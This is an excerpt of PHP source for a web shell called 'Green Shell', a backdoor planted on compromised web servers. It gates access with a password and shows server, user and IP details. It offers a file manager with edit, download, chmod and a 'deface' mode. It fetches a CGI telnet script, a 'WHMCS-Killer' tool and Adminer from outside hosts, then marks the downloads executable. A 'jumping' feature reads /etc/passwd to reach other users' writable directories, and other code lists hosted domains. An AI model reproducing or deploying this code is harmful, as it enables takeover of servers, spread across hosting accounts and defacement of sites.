...
if (!empty($Pass))
{
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $Pass)) prototype(md5($_SERVER['HTTP_HOST']) , $Pass);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $Pass)) hardLogin();
}
...
function printHeader()
{
    ...
    echo '<html>
<meta http-equiv="Content-Type" content="text/html; charset=' . $_POST['charset'] . '"><title>Green Shell</title>
<style>
        body {background-color:#000;background-image:url("https://i.imgur.com/4bYhdRM.png");background-size: 32%;color:#fff;
        ...
        div.content    { padding: 0px;margin:0 0px;background: #5555556b; border:1px solid ' . $Theme . '; border-style:dashed; border-radius:5px; }
        ...
        .toolsInp    { width:350px; height:25px;background:#0F1010;border-color:#008000b0; border-radius: 5px;  }
        ...
        .menu th:hover{background:green;text-decoration: none;}
    ...
    <head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;"><div class="content" style="border:1px solid ' . $Theme . '; border-style:dashed;  border-radius:5px;">
    ...
    if (!empty($GLOBALS['Pass'])) $m['Logout'] = 'Logout';
    ...
    if ($GLOBALS['os'] == 'win')
    {
        ...
        {
            if (is_dir($drive . ':\\')) $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
        }
        $drives .= '<br />: ';
    }
    if ($GLOBALS['os'] == 'nix')
    {
        ...
        else
        {
            ...
            $d0c = "<t style='background:green;text-shadow: 0px 0px 0px;'>" . $out . "  Domains</t>";
        }
    }
    else
    {
        $d0c = "<t style='background:green;text-shadow: 0px 0px 0px;'>Nothing here bro</t>";
    }
    if ($GLOBALS['os'] == 'nix')
    {
        $usefl = '';
    ...
    echo '<div><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
          <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr><t style="background:green;text-shadow: 0px 0px 0px;">' . substr(@php_uname() , 0, 120) . '</t></nobr></td></tr>
          <tr><td><span>User</span></td><td>: ' . $uid . ' ( ' . $user . ' ) <span>Group: </span> ' . $gid . ' ( ' . $group . ' )</td></tr><tr><td><span>Server</span></td><td>: <t style="background:green;text-shadow: 0px 0px 0px;">' . @getenv('SERVER_SOFTWARE') . '</t></td></tr>
		  ...
		  <tr><td><span>' . ($GLOBALS['os'] == 'win' ? 'Drives<br />Cwd' : 'Cwd') . '</span></td><td>: ' . $drives . '' . $cwd_links . ' ' . viewPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ Home ]</a></td></tr></table></td>' . '<td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free<br /><span>Domains</span></nobr></td></b>

		 
		 ' . '<td width="3"><nobr>: ' . gethostbyname($_SERVER["HTTP_HOST"]) . '<br>: ' . $_SERVER['REMOTE_ADDR'] . '<br />: ' . viewSize($totalSpace) . '<br />: ' . viewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%)<br>:  ' . $d0c . ' <br>
		 
		 <br>&nbsp;&nbsp;<b style="background:green;"><a href=# onclick="g(\'Lock\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">LOCK ME</a></b>&nbsp;<t style="background:red;text-shadow: 0px 0px 0px;">New</t>
		 
		 
		 </nobr></td></tr></table></div>' . '</div></div><div style="margin:5;"><div class="content" style="padding:3px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>' . $menu . '</tr></table></div></div><div style="margin:5;">';
}

function printFooter()
{
    $is_writable = is_writable($GLOBALS['cwd']) ? "<font color=#00BB00>[ Writeable ]</font>" : "<font color=red>[ Not writable ]</font>";
...
function actionFilesMan()
{
    ...
    if (isset($_POST['p1']) && $_POST['p1'] != 'deface')
    {
        ...
        if (!empty($_POST['p1']))
        {
            if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array(
                $match[1],
                (int)$match[2]
            );
        }
        ...
        for ($i = 0;$i < $n;$i++)
        {
            ...
            if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array(
                'type' => 'file'
            ));
            elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $links[] = array_merge($tmp, array(
                'type' => 'link'
            ));
            elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array(
                'type' => 'dir'
            ));
        }
        $GLOBALS['sort'] = $sort;
	...
	<td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');"><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a>
	
	
	<a href=# onclick="' . ((preg_match('/\.(zip|ZIP)$/', $f['name'])) ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'unzip\')">' . ('&nbsp;<b style="background:green;text-shadow: 0px 0px 0px;">unzip</b>') : 'g(\'FilesMan\',\'' . $f['path'] . '\');">') . '</a></td>


		<td>' . (($f['type'] == 'file') ? viewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (($f['type'] == 'file') ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
            $l = $l ? 0 : 1;
        }
    ...
    function actionFilesTools()
    {
            ...
            case 'unzip':
                ...
                if (preg_match('/\.(zip|ZIP)$/', $_POST['p1']))
                {
                    ...
                    if ($zip->open($_POST['p1']) === true)
                    {
                        ...
                        $zip->close();
                        $GLOBALS['status'] = array(
                            'success' => '<b style="font-size: 20px;background:green;text-shadow: 0px 0px;">File unzipped successfully</b>'
                        );
                    }
                    else
                    {
                        $GLOBALS['status'] = array(
                            'error' => '<b style="font-size: 20px;background:red;text-shadow: 0px 0px;">Error unzipping file</b>'
                        );
                    }
                }
                echo '<center>';
        ...
        function actionSafeMode()
        {
            ...
            {
                if (cgitelnet("https://raw.githubusercontent.com/leetpromax/cgitelnet/main/cgitelnet.pl", "cgi.new"))
                {
                    echo "<br><br><center>[ Done ... <a href='telnet/cgi.new' target='_blank'>Click Here ]</a><br><br></div></center>";
                    chmod($file_cgi, 0755);
                    chmod($memeg, 0755);
...
");
        ...
        function actionwhmcs()
        {
            ...
            {
                if (whmcs("https://raw.githubusercontent.com/iamhex/WHMCS-Killer-v4/master/whmcs.php", "whmcs.php"))
                {
        ...
        function actionAdminer()
        {
            ...
            {
                if (adminer("https://www.adminer.org/static/download/4.8.0/adminer-4.8.0-en.php", "adminer.php"))
                {
        ...
        function actionJumping()
        {
            ...
            $etc = fopen("/etc/passwd", "r") or print ("<font color=white>Can't read /etc/passwd</font>");
            while ($passwd = fgets($etc))
            {
                ...
                else
                {
                    ...
                    foreach ($user_jumping[1] as $user_Anonymous_jump)
                    {
                        ...
                        {
                            $i++;
                            $jrw = '[<font color=white>R</font>]<a href="#" onclick="g(\'FilesMan\',\'' . $user_jumping_dir . '/\')">[ ' . $user_jumping_dir . ' ]</a>';
                            if (is_writable($user_jumping_dir))
                            {
                                $jrw = '[<font color=white>RW</font>]<a href="#" onclick="g(\'FilesMan\',\'' . $user_jumping_dir . '/\')">[ ' . $user_jumping_dir . ' ]</a> ';
                            }
                            echo $jrw;
	...
	<table><form name=em onSubmit="g(null,null,\'ems\',this.mailto.value,this.usere.value);return false;"><tr><td><span>Send to: </span></td>' . "<td><input type=text style=height:25px; name=mailto value=><input type=hidden name=usere value=$user></td><td><input type=submit value=Send></td></tr></form></table><br>";
            if (isset($_POST['p1']))
            {
                if ($_POST['p1'] == 'ems')
                {
                    ...
                    $headers = "From: " . $_POST['p3'] . "<$from_add>
";
...
";
        ...
        function actionDomain()
        {
            ...
            if (!$file)
            {
                ...
                $count = 1;
                $dc = 0;
                echo "<br><table align=center class=xd  width=50%  cellpadding=5>
<tr class='l1'><td colspan=2>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.Can't read named.cof .Domains are bypassed actually,you will face problem in symlink. </td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
            ...
            else
            {
                ...
                echo "<br><table align=center class=xd width=59% cellpadding=5>
<tr ><td colspan=2 > There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
<tr class='l1'><td>No</td><td>Domain</td><td>User</td></tr>";
                foreach ($domains as $domain)
                {
                    $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
                    echo "<tr class='l1'><td>" . $count++ . "</td><td><a href='http://" . $domain . "' target='_blank'>" . $domain . "</a></td><td>" . $user['name'] . "</td></tr>";
                }
                echo '</table><br></div>';
            }
            printFooter();
